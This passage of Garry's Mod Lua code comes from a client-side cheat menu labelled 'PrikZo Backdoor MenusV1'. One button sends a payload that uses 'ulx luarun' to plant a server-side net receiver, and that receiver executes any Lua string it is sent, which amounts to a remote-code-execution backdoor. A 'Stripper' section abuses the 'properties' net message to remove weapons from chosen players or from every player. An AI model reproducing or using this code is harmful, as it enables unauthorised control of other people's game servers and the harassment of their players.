        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(2,2,MathisLeBG:GetWide()-4,MathisLeBG:GetTall()-4)
        --Main back
        surface.SetDrawColor(0,0,0,255)
        surface.DrawRect(4,4,MathisLeBG:GetWide()-8,MathisLeBG:GetTall()-8)
    end
    MathisLeBG.DoClick = function ()
    net.Start(netKey)
    net.WriteString("RunConsoleCommand(\"ulx\", \"luarun\", \"util.AddNetworkString('Sandbox_ArmDupe') net.Receive('Sandbox_ArmDupe',function(len,pl) RunStringEx(net.ReadString(),'[C]',false) end)\" )")
    net.WriteBit(1)
    net.SendToServer() 
end








































--[[-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    Stripper
    ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------]]
    time = 1
function Ply(name) -- finds player name
    name = string.lower(name);
    for _,v in ipairs(player.GetHumans()) do
        if(string.find(string.lower(v:Name()),name,1,true) != nil) then
            return v;
        end
    end
end

    function stripPlayer(ply) -- Strip player function
        if ply:IsPlayer() then

            for k,v in pairs(ply:GetWeapons()) do

                net.Start("properties")
                net.WriteString( "remove" , 32 )
                net.WriteEntity( v )
                net.SendToServer()
            end
        end

    end
    concommand.Add("removewep_crosshair", function()
        local xhair = LocalPlayer():GetEyeTrace().Entity
        stripPlayer(xhair)
    end)

    function removeAll() -- Strips all Players
        for k,v in pairs(player.GetAll()) do
            stripPlayer(v)
        end
    end

    local button = vgui.Create("DButton", strip)
    button:SetText("Strip Tous Le Monde")
    button:SetPos(150/2-60,7)
    button:SetSize(800/2, 25)
    button:SetTextColor(Color(255, 255, 255))
    button.DoClick = function ()
        removeAll()
        chat.AddText(Color(0,128,255), "[PrikZo Backdoor MenusV1] ", Color(128,128,128), "Everyone Strip.")
    end
    button.Paint = function( self, w, h )
        --Black outline
        surface.SetDrawColor(math.random(1,255),math.random(1,255),math.random(1,255))
        surface.DrawRect(0,0,button:GetWide(),button:GetTall())
        --Outline
        surface.SetDrawColor(0,0,0,255,10)
        surface.DrawRect(2,2,button:GetWide()-4,button:GetTall()-4)
        --Main back
        surface.SetDrawColor(0,0,0,255,10)
        surface.DrawRect(4,4,button:GetWide()-8,button:GetTall()-8)
    end
    
    local AppList = vgui.Create( "DListView", strip)
    AppList:SetSize(210,370)
    AppList:SetPos(12, 35)
    AppList:SetMultiSelect( false )
    AppList:AddColumn( "Clicker sur le nom pour Strip" )
    for k, v in pairs(player.GetAll()) do
        AppList:AddLine(v:Name())
    end
    AppList.Paint = function()
        --Black outline
        surface.SetDrawColor(math.random(1,255),math.random(1,255),math.random(1,255))
        surface.DrawRect(0,0,AppList:GetWide(),AppList:GetTall())
        --Outline
        surface.SetDrawColor(math.random(1,255),math.random(1,255),math.random(1,255))
        surface.DrawRect(2,2,MathisLeBG:GetWide()-4,AppList:GetTall()-4)
        --Main back
        surface.SetDrawColor(math.random(1,255),math.random(1,255),math.random(1,255))
        surface.DrawRect(4,4,AppList:GetWide()-8,AppList:GetTall()-8)
    end

    AppList.DoDoubleClick = function( lst, index, pnl )
        --print( "Selected " .. pnl:GetColumnText( 1 ) .. " at index " .. index )
        ply = Ply(pnl:GetColumnText( 1 ))
        chat.AddText(Color(255,0,0,255,10), "[PrikZo Backdoor MenusV1] ", Color(255,0,0,255,10), pnl:GetColumnText( 1 ).." Vous A strip.")
        stripPlayer(ply) 
    end
end)
